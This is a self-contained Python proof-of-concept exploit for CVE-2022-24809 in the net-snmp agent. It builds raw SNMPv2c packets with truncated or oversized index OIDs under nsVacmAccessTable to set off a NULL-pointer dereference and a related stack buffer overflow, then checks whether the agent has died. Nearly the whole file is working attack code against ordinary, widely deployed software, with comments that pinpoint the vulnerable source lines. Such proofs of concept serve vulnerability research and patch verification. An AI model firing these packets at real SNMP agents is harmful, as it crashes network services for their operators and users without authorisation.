#!/usr/bin/env python3
"""PoC for CVE-2022-24809 - NULL pointer deref in net-snmp nsVacmAccessTable.c.

Crafts SNMPv2c GET-NEXT (PDU type 0xA1) requests with malformed / short OIDs
under the NET-SNMP-VACM-MIB::nsVacmAccessTable subtree (1.3.6.1.4.1.8072.1.9.1).
The vulnerable agent walks table_info->indexes to the 4th index without a NULL
check; a GET-NEXT whose OID is missing index components yields NULL indexes and
the agent dereferences it -> SIGSEGV (caught by ASan when built with it).

Self-contained: includes a minimal BER encoder, no pysnmp required.
Usage: poc_2022_24809.py [host] [port]   (default 127.0.0.1 16166)
"""
import socket
import sys
import time


def enc_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    out = []
    while n:
        out.insert(0, n & 0xFF)
        n >>= 8
    return bytes([0x80 | len(out)]) + bytes(out)


def tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + enc_len(len(value)) + value


def enc_int(n: int) -> bytes:
    if n == 0:
        body = b"\x00"
    else:
        body = []
        v = n
        while v:
            body.insert(0, v & 0xFF)
            v >>= 8
        if body[0] & 0x80:
            body.insert(0, 0)
        body = bytes(body)
    return tlv(0x02, body)


def enc_oid(parts) -> bytes:
    if len(parts) < 2:
        # truly degenerate OID (single arc) — encode raw
        body = bytes(parts)
        return tlv(0x06, body)
    body = bytes([parts[0] * 40 + parts[1]])
    for arc in parts[2:]:
        if arc < 0x80:
            body += bytes([arc])
        else:
            stack = []
            while arc:
                stack.insert(0, arc & 0x7F)
                arc >>= 7
            for i in range(len(stack) - 1):
                stack[i] |= 0x80
            body += bytes(stack)
    return tlv(0x06, body)


def enc_str(s: bytes) -> bytes:
    return tlv(0x04, s)


def enc_null() -> bytes:
    return tlv(0x05, b"")


def varbind(oid_parts) -> bytes:
    return tlv(0x30, enc_oid(oid_parts) + enc_null())


def pdu_msg(community: bytes, oid_parts, reqid: int, pdu_tag: int) -> bytes:
    vbl = tlv(0x30, varbind(oid_parts))
    pdu = tlv(
        pdu_tag,  # 0xA0 GET, 0xA1 GET-NEXT
        enc_int(reqid) + enc_int(0) + enc_int(0) + vbl,
    )
    msg = tlv(
        0x30,
        enc_int(1)  # version: 1 == SNMPv2c
        + enc_str(community)
        + pdu,
    )
    return msg


def fire(host: str, port: int, oid_parts, reqid: int, label: str, pdu_tag: int = 0xA1):
    pkt = pdu_msg(b"public", oid_parts, reqid, pdu_tag)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)
    try:
        s.sendto(pkt, (host, port))
        try:
            data, _ = s.recvfrom(65535)
            print(f"  [{label}] reply {len(data)} bytes: {data[:48].hex()}")
        except socket.timeout:
            print(f"  [{label}] NO REPLY (timeout) <- possible crash/hang")
    finally:
        s.close()


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 16166

    base = [1, 3, 6, 1, 4, 1, 8072, 1, 9, 1]  # nsVacmAccessTable
    # Columns (nsVacmAccessEntry .1 then column number):
    #   col 2 = nsVacmContextMatch, 3 = nsVacmViewName, 4 = storageType, 5 = status
    col_ctx = base + [1, 2]   # COLUMN_NSVACMCONTEXTMATCH (the MODE_GET branch)

    # A real, fully-indexed instance OID looks like (numeric):
    #   <col>.8.g.r.p.c.o.m.m.1 . 0 . 0 . 1 . 4.r.e.a.d
    #   i.e. vacmGroupName(len8 "grpcomm1") . ctxPrefix(len0) . secModel(0)
    #        . secLevel(1) . nsVacmAuthType(len4 "read")
    grp = [8, 103, 114, 112, 99, 111, 109, 109, 49]      # "grpcomm1"
    ctxpfx = [0]                                          # zero-length string
    secmodel = [0]
    seclevel = [1]
    authtype = [4, 114, 101, 97, 100]                    # "read"
    full_idx = grp + ctxpfx + secmodel + seclevel + authtype

    # ---- PRIMARY trigger (verified to crash) -----------------------------
    # nsVacmAccessTable_handler walks the index list to the 4th next_variable
    # and does memcpy(atype, idx->val.string, idx->val_len) into a fixed
    # char atype[20] BEFORE any bounds/NULL check (nsVacmAccessTable.c:175-177
    # in v5.9.1). A malformed OID whose final index component (nsVacmAuthType)
    # is longer than 20 bytes overflows atype -> stack-buffer-overflow / SIGSEGV.
    # NOTE: this oversized-index OOB write is the CWE-120 face fixed as the
    # SIBLING CVE-2022-24807 (SET path). CVE-2022-24809 proper is the CWE-476
    # NULL-indexes dereference exercised by the SECONDARY short-OID variants
    # below; both stem from the same unguarded index walk and were fixed
    # together in net-snmp 5.9.2. Build is ASan so this aborts hard.
    longauth = [30] + [0x41] * 30  # nsVacmAuthType OCTET STR, declared len 30
    crash_oid = col_ctx + grp + ctxpfx + secmodel + seclevel + longauth
    print(f"[*] CVE-2022-24809 PoC -> {host}:{port}")
    print("[*] PRIMARY: oversized-authType-index GET/GET-NEXT (atype[20] overflow)")
    fire(host, port, crash_oid, 0x4000, "crash-GET", pdu_tag=0xA0)
    fire(host, port, crash_oid, 0x4001, "crash-GETNEXT", pdu_tag=0xA1)

    # ---- SECONDARY: malformed/short-OID variants (NULL-indexes deref face) -
    print("[*] SECONDARY: malformed/short-OID GET + GET-NEXT variants")
    secondary = [
        ("get-noidx", 0xA0, col_ctx),
        ("get-grponly", 0xA0, col_ctx + grp),
        ("get-grp+model+level", 0xA0, col_ctx + grp + ctxpfx + secmodel + seclevel),
        ("get-full", 0xA0, col_ctx + full_idx),  # control: well-formed
        ("gn-bare-table", 0xA1, base),
        ("gn-col-noidx", 0xA1, col_ctx),
        ("gn-col-shortidx", 0xA1, col_ctx + grp[:3]),
    ]
    for i, (label, tag, oid) in enumerate(secondary):
        fire(host, port, oid, 0x1800 + i, label, pdu_tag=tag)
        time.sleep(0.15)

    # Liveness check: if the agent is dead, this times out.
    print("[*] liveness getnext on bare table OID:")
    fire(host, port, base, 0x2000, "liveness", pdu_tag=0xA1)


if __name__ == "__main__":
    main()
